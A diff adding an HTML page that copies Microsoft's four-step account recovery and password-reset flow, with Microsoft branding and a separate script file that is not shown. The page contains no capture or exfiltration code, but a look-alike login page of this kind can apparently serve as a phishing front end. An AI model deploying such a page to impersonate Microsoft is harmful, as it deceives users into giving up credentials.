@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Microsoft Account</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div class="container">
+        <div class="form-container" id="step1">
+            <div class="logo">
+                <img src="logo.png" alt="Microsoft">
+            </div>
+            <h1>Recover your account</h1>
+            <p>We can help you reset your password and security info. First, enter your Microsoft account and follow the instructions below.</p>
+            <div class="form-group">
+                <input type="text" placeholder="Email, phone, or Skype name" maxlength="120">
+            </div>
+            <div class="button-group">
+                <button class="btn-secondary">Cancel</button>
+                <button class="btn-primary">Next</button>
+            </div>
+        </div>
+
+        <div class="form-container hidden" id="step2">
+            <div class="logo">
+                <img src="logo.png" alt="Microsoft">
+            </div>
+            <h1>We need to verify your identity</h1>
+            <p>How would you like to get your security code?</p>
+            <div class="radio-group">
+                <label>
+                    <input type="radio" name="verification" checked>
+                    Email
+                </label>
+            </div>
+            <div class="links">
+                <a href="#">I have a code</a>
+                <a href="#">I don't have any of these</a>
+            </div>
+            <div class="button-group">
+                <button class="btn-secondary">Cancel</button>
+                <button class="btn-primary">Get code</button>
+            </div>
+        </div>
+
+        <div class="form-container hidden" id="step3">
+            <div class="logo">
+                <img src="logo.png" alt="Microsoft">
+            </div>
+            <h1>Verify your identity</h1>
+            <p></p>
+            <div class="form-group">
+                <input type="text" placeholder="Enter code">
+            </div>
+            <div class="links">
+                <a href="#">Use a different verification option</a>
+            </div>
+            <div class="button-group">
+                <button class="btn-secondary">Cancel</button>
+                <button class="btn-primary">Next</button>
+            </div>
+        </div>
+
+        <div class="form-container hidden" id="step4">
+            <div class="logo">
+                <img src="logo.png" alt="Microsoft">
+            </div>
+            <div class="user-email"></div>
+            <h1>Reset your password</h1>
+            <p>8-character minimum; case-sensitive</p>
+            <div class="form-group">
+                <input type="password" placeholder="New password">
+            </div>
+            <div class="form-group">
+                <input type="password" placeholder="Reenter password">
+            </div>
+            <div class="button-group">
+                <button class="btn-secondary">Cancel</button>
+                <button class="btn-primary">Next</button>
+            </div>
+        </div>
+    </div>
+    <footer>
+        <div class="footer-links">
+            <a href="#">Terms of use</a>
+            <a href="#">Privacy & cookies</a>
+        </div>
+        <div class="private-browsing">
+            Use private browsing if this is not your device. <a href="#">Learn more</a>
+        </div>
+    </footer>
+    <script src="script.js"></script>
+</body>
+</html>
